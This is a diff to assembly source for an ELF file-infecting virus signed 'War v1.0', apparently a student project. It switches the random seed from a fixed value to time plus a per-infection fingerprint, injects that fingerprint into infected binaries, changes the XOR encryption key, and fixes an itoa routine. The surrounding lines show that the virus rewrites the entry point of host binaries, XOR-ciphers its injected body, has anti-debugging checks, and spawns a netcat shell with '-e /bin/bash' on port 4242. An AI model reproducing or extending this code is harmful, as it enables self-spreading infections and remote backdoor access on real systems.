@@ -113,39 +113,6 @@ can_run_infection:
 	cmp rax, 1					; if (_ret == 1)
 	je .process					; 	goto .process;
 %endif
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
-nop
 .end_anti_debugging:
 
 
@@ -525,14 +492,15 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0xd8, 0x1d, 0xad, 0xcd, 0x94, 0x90, 0x90, 0xd8, 0x1b, 0xa5, 0x0c, 0x93, 0x90, 0x90, 0xd8, 0x1d
-db 0x85, 0x0d, 0x93, 0x90, 0x90, 0x29, 0x99, 0x90, 0x90, 0x90, 0x78, 0xd8, 0x92, 0x90, 0x90, 0x7b
-db 0xbc
+magic_key: db 0xf0, 0xe8, 0x3d, 0x65, 0x04, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
+db 0x1a, 0x9a, 0x4b, 0x83, 0xf8, 0xb9, 0x75, 0x67, 0xe8, 0x82, 0xe8, 0x4a, 0x02, 0x48, 0x83, 0x13
+db 0x2f, 0xe4, 0xfc
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
 clean: db 0x0
 signature: db "War v1.0 by jmaia and dhubleur - "
-fingerprint: db "0", "0", "0", "0", "0", "0", "0", "0", "0", "0", 0
+fingerprint_str: db "0000000000", 0
+fingerprint_int: dd 0
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -558,7 +526,12 @@ infection_routine:
 	mov [compressed_data_size], rdi			; compressed_data_size = _compressed_data_size;
 	mov [real_begin_compressed_data_ptr], rsi	; real_begin_compressed_data_ptr = _real_begin_compressed_data_ptr;
 
-	mov rdi, 42					; srand(42);
+	mov rax, SYS_TIME				; _ret = time(
+	xor rdi, rdi					; NULL
+	syscall						; );
+
+	add rax, [rel fingerprint_int]			; _base = _ret + fingerprint_int;
+	mov rdi, rax					; srand(_base);
 	lea rsi, [rand_buffer]				; ...
 	lea rdx, [rand_index]				; ...
 	call srand					; ...
@@ -759,6 +732,7 @@ treat_file:
 	%assign %$localsize %$localsize + BUFFER_SIZE	; ...
 	%local rand_buffer:qword			; unsigned int *rand_buffer;
 	%local rand_index:qword				; long *rand_index;
+	%local fingerprint:dword			; unsigned int fingerprint;
 
 	; Initializes stack frame
 	push rbp
@@ -960,28 +934,38 @@ treat_file:
 	mov rax, [compressed_data_size]			; *_compressed_data_size2_ptr = compressed_data_size;
 	mov [rdi], rax					; ...
 
+	; generate fingerprint
+	mov rdi, [rand_buffer]				; _fingeprint = rand(
+	mov rsi, [rand_index]				; rand_buffer,
+	call rand					; rand_index);
+	mov [fingerprint], eax				; fingerprint = _fingerprint;
+
+	; Change fingerprint_int in injected code
+	mov rdi, [mappedfile]				; _fingerprint_int_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, fingerprint_int - _start		; 	+ (fingerprint_int - _start)
+	mov eax, [fingerprint]				; *_fingerprint_int_str = fingerprint;
+	mov [rdi], eax					; ...
+
+	; Change fingerprint_str in injected code
+	mov rdi, [mappedfile]				; _fingerprint_str_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, fingerprint_str - _start		; 	+ (fingerprint_str - _start)
+	mov esi, [fingerprint]				; _fingerprint = fingerprint;
+	call itoa					; itoa(_fingerprint_str_ptr, _fingerprint);
+
 	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
-
-	; change fingerprint in injected code
-	mov rdi, [rand_buffer]				; fingeprint = rand();
-	mov rsi, [rand_index]				; ...
-	call rand					; ...
-	mov rsi, rax					; ...
-	mov rdi, [mappedfile]				; _fingerprint_ptr = file_map
-	add rdi, [filesize]				; 	+ filesize
-	add rdi, fingerprint - _start			; 	+ (fingerprint - _start)
-	call itoa					; itoa(_fingerprint_ptr, fingeprint);
 
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - _start		;
 	mov rsi, [compressed_data_size]			; size = compressed_data_size
-	lea rdx, [rel key]				; key = key
-	mov rcx, key_size				; key_size = key_size
+	lea rdx, [rel key]				; key = &key;
+	mov rcx, key_size				; key_size = key_size;
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 
@@ -1508,11 +1492,11 @@ rand:
 		%pop
 		ret					; return y;
 
-; void itoa(uint8_t _buf[10], uint64_t _number);
-; void itoa(rdi _buf, rsi _number);
+; void itoa(uint8_t _buf[10], uint32_t _number);
+; void itoa(rdi _buf, esi _number);
 itoa:
 	push rdi
-	mov al, '0'				; _digit = 0;
+	mov al, '0'				; _digit = '0';
 	mov rcx, 10				; _count = 10;
 	rep stosb				; memset(_buf, _digit, _count);
 	pop rdi
@@ -1520,11 +1504,12 @@ itoa:
 	mov r8, rdi				; _cur_buf_ptr = buf + 9;
 	add r8, 9				; ...;
 	xor rdx, rdx				; _divided = _number;
-	mov rax, rsi				; ...
+	xor rax, rax				; ...
+	mov eax, esi				; ...
 	mov r9, 10				; _div = 10;
 
 .begin_loop:
-	cmp rax, 0				; while (_divided != 0) {
+	cmp eax, 0				; while (_divided != 0) {
 	je .end_loop
 
 	div r9					; _quotient(rax), _remainder(rdx) = _number / _div;
